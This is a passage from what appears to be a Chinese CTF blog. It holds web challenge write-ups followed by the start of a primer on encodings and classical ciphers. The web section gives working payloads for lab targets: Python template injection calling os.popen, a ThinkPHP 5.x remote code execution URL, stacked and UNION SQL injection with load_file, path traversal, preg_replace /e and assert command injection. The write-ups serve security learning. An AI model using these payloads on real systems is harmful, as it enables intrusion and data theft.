class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$_o</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$str</span>)));;       <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;      <br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)-<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);<br>        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;<br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-variable">$miwen</span>)<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><h4 id="python模板注入"><a href="#python模板注入" class="headerlink" title="python模板注入"></a>python模板注入</h4>4确认存在模板注入漏洞<img src="image-20230313111017306.png" alt="image-20230313111017306" style="zoom:50%;" /><p>查看所有模块 <code>&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code>      </p><p>选用 <strong>os.popen</strong>，从所有模块中找到**&lt;class ‘site._Printer’&gt;**，为71</p><p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code></p><p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()&#125;&#125;</code></p><h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><h4 id="thinkphp-v5-x-远程代码执行漏洞"><a href="#thinkphp-v5-x-远程代码执行漏洞" class="headerlink" title="thinkphp v5.x 远程代码执行漏洞"></a>thinkphp v5.x 远程代码执行漏洞</h4><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://61.147.171.105:63639/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=find / -name flag<br><span class="hljs-link">http://61.147.171.105:63639/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=cat /flag<br><br></code></pre></td></tr></table></figure><h3 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h3><h4 id="SQL注入（堆叠注入）"><a href="#SQL注入（堆叠注入）" class="headerlink" title="SQL注入（堆叠注入）"></a>SQL注入（堆叠注入）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases#</span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> tables#<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`#</span><br><span class="hljs-string"></span><br><span class="hljs-string">//和web被查询的表互换</span><br><span class="hljs-string">1&#x27;</span>;rename tables `words` <span class="hljs-keyword">to</span> `words1`;rename tables `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> `words`; <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `words` change `flag` `id` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);#<br></code></pre></td></tr></table></figure><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];      <span class="hljs-comment">//设置白名单</span><br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;                   <span class="hljs-comment">//$page是否存在并且为字符串类型</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;             <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );                                       <span class="hljs-comment">//以?分割存在白名单中</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;                                   <span class="hljs-comment">//分割存在白名单中返回true</span><br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])                      <br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])                 <span class="hljs-comment">//存在file参数且为字符串</span><br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="image-20230313193542911.png" alt="image-20230313193542911" style="zoom:50%;" /><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure><h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><h4 id="Git代码泄露以及PHP-x3D-x3D-比较绕过"><a href="#Git代码泄露以及PHP-x3D-x3D-比较绕过" class="headerlink" title="Git代码泄露以及PHP &#x3D;&#x3D; 比较绕过"></a>Git代码泄露以及PHP &#x3D;&#x3D; 比较绕过</h4><p>扫描发现&#x2F;.git&#x2F;路径，使用GitHack得到源码</p><p>进行代码审计，发现可通过绕过 &#x3D;&#x3D; 增加金钱，购买flag</p><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313205338816.png" alt="image-20230313205338816"></p><img src="image-20230313205643826.png" alt="image-20230313205643826" style="zoom:50%;" /><p><strong>使用[true,true,true,true,true,true,true]绕过 &#x3D;&#x3D;</strong></p><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313205041049.png" alt="image-20230313205041049"></p><h3 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h3><h4 id="PHP文件包含及preg-replace方法漏洞"><a href="#PHP文件包含及preg-replace方法漏洞" class="headerlink" title="PHP文件包含及preg_replace方法漏洞"></a>PHP文件包含及preg_replace方法漏洞</h4><p>存在文件包含漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51483</span><span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>得到index.php源码</p><p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313213352601.png" alt="image-20230313213352601"></p><p>解码base64得到核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;      <span class="hljs-comment">//添加X-Forwarded-For头</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];                   <span class="hljs-comment">//get请求添加三个参数</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;         <br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>其中<strong>preg_replace方法存在漏洞</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_replace 函数执行一个正则表达式的搜索和替换<br><br><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br><br>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。<br><br>• <span class="hljs-variable">$pattern</span>: 要搜索的模式，可以是字符串或一个字符串数组。<br>• <span class="hljs-variable">$replacement</span>: 用于替换的字符串或字符串数组。<br>• <span class="hljs-variable">$subject</span>: 要搜索替换的目标字符串或字符串数组。<br>• <span class="hljs-variable">$limit</span>: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-<span class="hljs-number">1</span>（无限制）。<br>• <span class="hljs-variable">$count</span>: 可选，为替换执行的次数。<br><br>然而这个函数有个漏洞<br>当<span class="hljs-variable">$pattern</span>使用了/e修正符，替换的时候会把<span class="hljs-variable">$replacement</span>替换进去的代码当成php代码执行，当然要构成合法的php代码才能正确执行。<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51483</span><span class="hljs-regexp">/index.php?pat=/</span><span class="hljs-number">123</span>/e&amp;rep=system(<span class="hljs-string">&#x27;ls&#x27;</span>)&amp;sub=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><img src="image-20230313214019196.png" alt="image-20230313214019196" style="zoom:50%;" /><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51483</span><span class="hljs-regexp">/index.php?pat=/</span><span class="hljs-number">123</span><span class="hljs-regexp">/e&amp;rep=system(&#x27;cd s3chahahaDir/</span>flag%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>cat flag.php<span class="hljs-string">&#x27;)&amp;sub=123</span><br></code></pre></td></tr></table></figure><h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><h4 id="Git代码泄露以及assert命令注入"><a href="#Git代码泄露以及assert命令注入" class="headerlink" title="Git代码泄露以及assert命令注入"></a>Git代码泄露以及assert命令注入</h4><p>git源代码泄露，进行代码分析</p><img src="image-20230314084124938.png" alt="image-20230314084124938" style="zoom:50%;" /><p>构造请求</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=abc&#x27;) <span class="hljs-keyword">or</span> system(<span class="hljs-string">&quot;cat templates/flag.php&quot;</span>);//<br></code></pre></td></tr></table></figure><p>使得assert执行为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;templates/abc&#x27;) or system(&quot;</span>cat templates/flag.php<span class="hljs-string">&quot;);//.php&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>迷糊测试，发现字符超过0x7F的ASCII都会引发Django的报错，在setting中找到数据库信息</p><img src="image-20230314105502526.png" alt="image-20230314105502526" style="zoom:50%;" /><img src="image-20230314104447257.png" alt="image-20230314104447257" style="zoom:67%;" /><p>构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=@<span class="hljs-regexp">/opt/</span>api/database.sqlite3<br></code></pre></td></tr></table></figure><h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>扫描存在flag.php</p><p>注册后发现注入点</p><img src="image-20230314143813560.png" alt="image-20230314143813560" style="zoom:50%;" /><p>&#x2F;view.php?no&#x3D;1 order by 4    成功，5失败，说明表有4个字段构成</p><p>&#x2F;view.php?no&#x3D;0 union++select 1,2,3,4</p><p>&#x2F;view.php?no&#x3D;0 union++select 1,database(),3,4</p><p>&#x2F;view.php?no&#x3D;0 union++select 1,user(),3,4</p><p>使用load_file函数，访问系统文件，并将内容以字符串形式返回</p><p><strong>&#x2F;view.php?no&#x3D;0 union++select 1,load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php’),3,4</strong></p><img src="image-20230314144938645.png" alt="image-20230314144938645" style="zoom:50%;" /><h3 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h3><h4 id="tornado模板注入"><a href="#tornado模板注入" class="headerlink" title="tornado模板注入"></a>tornado模板注入</h4><p>使用或者就可获得settings中的<strong>cookie_secret</strong>。</p><img src="image-20230314200139093.png" alt="image-20230314200139093" style="zoom:50%;" />]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-Crypto密码学</title>
    <link href="/2023/03/03/CTF-Crypto%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <url>/2023/03/03/CTF-Crypto%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="关于CTF"><a href="#关于CTF" class="headerlink" title="关于CTF"></a>关于CTF</h2><p>CTF(Capture The Flag)，即夺旗赛。在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容(<strong>Flag</strong>)，并将其提交给主办方，从而夺得分数。</p><p>CTF竞赛模式具体分为以下三类：</p><ol><li><p>解题模式</p><p>通过互联网或现场网络参与，解决网络安全技术挑战题目，并以分值和时间排名。</p></li><li><p>攻防模式</p><p>在攻防（AWD）模式CTF赛制中，在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手来得分，修补自身服务漏洞进行防御来避免丢分。</p></li><li><p>混合模式</p><p>结合了解题模式与攻防模式的CTF赛制，参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。</p></li></ol><p>赛题类型一般分为Web 渗透、Crypto 密码学、Pwn 二进制、Reverse 逆向、Misc 杂项，拓展的还有Mobile 移动设备, Forensics 电子取证等，这些其实都可以归入前面五大类中。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><h4 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h4><p><img src="/2023/03/03/CTF-Crypto%E5%AF%86%E7%A0%81%E5%AD%A6/ASCII.jpg" alt="ASCII"></p><h4 id="Base64-Base32-Base16编码"><a href="#Base64-Base32-Base16编码" class="headerlink" title="Base64\Base32\Base16编码"></a>Base64\Base32\Base16编码</h4><p>常见的base系列编码有base64、base32、base16，其中</p><p>base64：含a<del>z,A</del>Z,0~9,+,&#x2F; 以及补位的 ‘’&#x3D;’’；(补齐字符串长度为4的倍数)</p><p>base32：含A<del>Z,2</del>7以及补位的 ‘’&#x3D;’’；(补齐字符串长度为8的倍数，可以不添加)</p><p>base16：含0<del>9,A</del>F。</p><p><strong>注意换表</strong></p><p><strong>参考：</strong><a href="https://www.qqxiuzi.cn/bianma/base.php">https://www.qqxiuzi.cn/bianma/base.php</a></p><h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><p>特征是以<code>\u数字或者字母加数字</code>，<code>\u</code>过后是每四个为一组。可以使用python的print函数输出。</p><h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。其形式为%加上十六进制数值。</p><h4 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h4><p>一些字符在 HTML 中是预留的，拥有特殊的含义，比如小于号‘&lt;’用于定义 HTML  标签的开始。如果我们希望浏览器正确地显示这些字符，我们必须在 HTML  源码中插入字符实体。用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。</p><p><a href="http://www.w3school.com.cn/html/html_entities.asp">http://www.w3school.com.cn/html/html_entities.asp</a></p><h4 id="莫尔斯电码和敲击码"><a href="#莫尔斯电码和敲击码" class="headerlink" title="莫尔斯电码和敲击码"></a>莫尔斯电码和敲击码</h4><p>摩尔斯电码（又译为摩斯密码，Morse  code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。它的代码包括五种：点、划、点和划之间的停顿、每个字符之间短的停顿、每个词之间中等的停顿以及句子之间长的停顿。</p><p>除此之外，常用的编码方式还有敲击码（Tap code）等。</p><h4 id="JSFuck"><a href="#JSFuck" class="headerlink" title="JSFuck"></a>JSFuck</h4><p>JSFuck也称为Jother编码，是JavaScript的一种变形编码，因此可以使用浏览器控制台输出。其源于一门编程语言Brainfuck，主要的思想就是只使用8种特定的符号来编写代码。而JSFuck也是沿用了这个思想，它仅仅使用6种符号来编写代码。它们分别是**(<strong>、</strong>)<strong>、</strong>+<strong>、</strong>[<strong>、</strong>]<strong>、</strong>!**。</p><p><a href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p><p><a href="http://www.liminba.com/tool/jsfuckdecode/">http://www.liminba.com/tool/jsfuckdecode/</a></p><h4 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h4><p>Brainfuck是一种极小化的计算机语言，目标是建立一种简单的、可以用最小的编译器来实现的、符合图灵完全思想的编程语言。BrainFuck 语言只有八种符号，所有的操作都由这八种符号（**&gt; &lt; + - . , [ ]** ）的组合来完成。</p><p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><h4 id="恺撒密码"><a href="#恺撒密码" class="headerlink" title="恺撒密码"></a>恺撒密码</h4><p>恺撒密码是一种替换加密的技术，明文中的所有字母都在字母表上向后(或向前)按照一个固定数值进行偏移，替换成密文。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">例如：<br>密钥：3（当偏移量是左移3的时候）<br>明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC<br>明文：FIGHTING<br>密文：ILJKWLQJ<br></code></pre></td></tr></table></figure><h4 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h4><p>栅栏密码就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">例如：<br>明文：The quick brown fox <span class="hljs-keyword">jumps</span> over the lazy dog<br>去空格：Thequickbrownfoxjumpsoverthelazydog<br>分组：Th eq ui ck <span class="hljs-keyword">br</span> <span class="hljs-keyword">ow</span> nf ox <span class="hljs-keyword">ju</span> mp <span class="hljs-keyword">so</span> <span class="hljs-keyword">ve</span> rt he <span class="hljs-keyword">la</span> zy <span class="hljs-keyword">do</span> g<br>密文：Teucbonojmsvrhlzdghqikrwfxupoeteayo<br></code></pre></td></tr></table></figure><h4 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h4><p>又名倍康尼密码（英语：Bacon’s cipher）是由法兰西斯·培根发明的一种隐写术。是一种替换密码，每个明文字母被一组五个英文字母的序列替换。如下表</p><p><img src="/2023/03/03/CTF-Crypto%E5%AF%86%E7%A0%81%E5%AD%A6/image-20230227134125266.png" alt="image-20230227134125266"></p><p>加密者需使用两种不同格式或属性，分别代表A和B。准备好一篇包含相同AB字数的假信息后，按照密文格式化假信息，即依密文中每个字母是A还是B分别套用两种格式或属性。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">例如：<br>密文：bAcon iS <span class="hljs-selector-tag">a</span> MEaT prodUcT prePared <span class="hljs-selector-tag">frOm</span> <span class="hljs-selector-tag">a</span> pig and UsuALLy cUReD<br>五个一组重新排列：bAcon iSaMEaTpro dUcTp rePar edfrO mapig andUs uALLy cUReD<br>小写字母转换成<span class="hljs-selector-tag">A</span>，大写字母转换成<span class="hljs-selector-tag">B</span>：abaaa ababb abaaa ababa aabaa aaaab aaaaa aaaba abbba abbab<br>根据转换表每五个密文字母对应一个明文字母，得到明文：<span class="hljs-selector-tag">i</span> like bacon<br></code></pre></td></tr></table></figure><h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>仿射密码是一种单表代换密码，字母表中的每个字母相应的值使用一个简单的数学函数映射到对应的数值，再把对应数值转换成字母。每一个字母都是通过函数（ax + b）mod m加密，其中b是位移量，为了保证仿射密码的可逆性，a和m需要互质，一般m为设置为26。</p><h4 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" 